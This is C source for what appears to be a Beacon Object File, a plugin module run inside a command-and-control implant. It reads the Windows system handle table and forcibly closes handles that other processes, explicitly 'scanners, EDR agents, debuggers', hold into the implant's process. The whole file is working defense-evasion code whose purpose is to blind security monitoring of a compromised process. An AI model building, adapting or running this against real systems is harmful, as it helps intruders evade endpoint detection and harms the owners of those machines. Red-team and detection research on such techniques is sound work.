/*
 * bof-handlestrip [all]
 *
 * Strip handles that other processes hold *into the current process* with
 * PROCESS_VM_READ (scanners, EDR agents, debuggers).  The system handle table
 * is read with NtQuerySystemInformation(SystemExtendedHandleInformation), the
 * current process object is identified through a handle we open ourselves, and
 * every matching foreign handle is closed with
 * DuplicateHandle(source, h, NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE).
 *
 * This does not close the current process's own handles.  Pass `all` to also
 * target foreign handles that do not include PROCESS_VM_READ.  Requires
 * PROCESS_DUP_HANDLE on the owning processes (administrator for most system
 * processes); failures are reported per handle.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define HS_MAX_PROCS 128

typedef struct {
    ULONG_PTR pid;
    HANDLE h;
} hs_proc;

static HANDLE hs_proc_handle(hs_proc *p, int *n, ULONG_PTR pid)
{
    HANDLE h;
    int i;

    for (i = 0; i < *n; i++)
        if (p[i].pid == pid) return p[i].h;
    if (*n >= HS_MAX_PROCS) return NULL;
    h = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)pid);
    if (!h) return NULL;
    p[*n].pid = pid;
    p[*n].h = h;
    (*n)++;
    return h;
}

void go(char *args, int alen)
{
    datap parser;
    char *mode = "";
    int mlen = 0, all = 0;
    HANDLE self = NULL;
    unsigned char *buf = NULL;
    unsigned int bufsz = 1u << 20;
    NTSTATUS st;
    unsigned long long own_pid = (unsigned long long)KERNEL32$GetCurrentProcessId();
    unsigned long long self_object = 0;
    unsigned int proc_type = 0xffffffffu;
    unsigned long long total = 0, matched = 0, closed = 0, failed = 0;
    int have_self = 0;
    hs_proc procs[HS_MAX_PROCS];
    int nprocs = 0;
    PSYSTEM_HANDLE_INFORMATION_EX info;
    ULONG_PTR i;

    BeaconDataParse(&parser, args, alen);
    mode = BeaconDataExtract(&parser, &mlen);
    if (mode && (bof_stricmp(mode, "all") == 0))
        all = 1;

    self = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE,
                                (DWORD)own_pid);
    if (!self) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(self) failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    for (;;) {
        buf = (unsigned char *)KERNEL32$VirtualAlloc(NULL, bufsz,
                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) {
            BeaconPrintf(CALLBACK_ERROR, "allocation failed\n");
            KERNEL32$CloseHandle(self);
            return;
        }
        st = NTDLL$NtQuerySystemInformation(SystemExtendedHandleInformation,
                                            buf, bufsz, NULL);
        if (st != (NTSTATUS)0xC0000004L)   /* STATUS_INFO_LENGTH_MISMATCH */
            break;
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        buf = NULL;
        if (bufsz >= 64u * 1024u * 1024u) {
            BeaconPrintf(CALLBACK_ERROR, "handle table too large\n");
            KERNEL32$CloseHandle(self);
            return;
        }
        bufsz *= 2;
    }
    if (st < 0) {
        BeaconPrintf(CALLBACK_ERROR, "NtQuerySystemInformation: 0x%08lx\n",
                     (unsigned long)st);
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        KERNEL32$CloseHandle(self);
        return;
    }

    info = (PSYSTEM_HANDLE_INFORMATION_EX)buf;
    total = info->NumberOfHandles;

    /* Locate our own handle entry to learn the process object + type index. */
    for (i = 0; i < info->NumberOfHandles; i++) {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX e = &info->Handles[i];
        if (e->UniqueProcessId == own_pid &&
            e->HandleValue == self) {
            self_object = (unsigned long long)(ULONG_PTR)e->Object;
            proc_type = e->ObjectTypeIndex;
            have_self = 1;
            break;
        }
    }
    if (!have_self) {
        BeaconPrintf(CALLBACK_ERROR,
                     "could not locate own process handle in the table\n");
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        KERNEL32$CloseHandle(self);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "================ handle strip ================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] pid %llu, %llu system handles\n",
                 own_pid, total);

    for (i = 0; i < info->NumberOfHandles; i++) {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX e = &info->Handles[i];
        HANDLE src;

        if (e->ObjectTypeIndex != proc_type) continue;
        if ((unsigned long long)(ULONG_PTR)e->Object != self_object) continue;
        if (e->UniqueProcessId == own_pid) continue;
        if (!all && !(e->GrantedAccess & PROCESS_VM_READ)) continue;

        matched++;
        src = hs_proc_handle(procs, &nprocs, e->UniqueProcessId);
        if (!src) {
            failed++;
            continue;
        }
        if (KERNEL32$DuplicateHandle(src, e->HandleValue, NULL, NULL,
                                     0, FALSE, DUPLICATE_CLOSE_SOURCE)) {
            closed++;
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[+] closed handle 0x%llx in pid %llu (access 0x%lx)\n",
                         (unsigned long long)(ULONG_PTR)e->HandleValue,
                         (unsigned long long)e->UniqueProcessId,
                         (unsigned long)e->GrantedAccess);
        } else {
            failed++;
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[!] close 0x%llx in pid %llu failed: %lu\n",
                         (unsigned long long)(ULONG_PTR)e->HandleValue,
                         (unsigned long long)e->UniqueProcessId,
                         (unsigned long)KERNEL32$GetLastError());
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT,
                 "\n[*] %llu matching handle(s): %llu closed, %llu failed\n",
                 matched, closed, failed);

    for (i = 0; i < (ULONG_PTR)nprocs; i++)
        if (procs[i].h) KERNEL32$CloseHandle(procs[i].h);
    KERNEL32$CloseHandle(self);
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
}
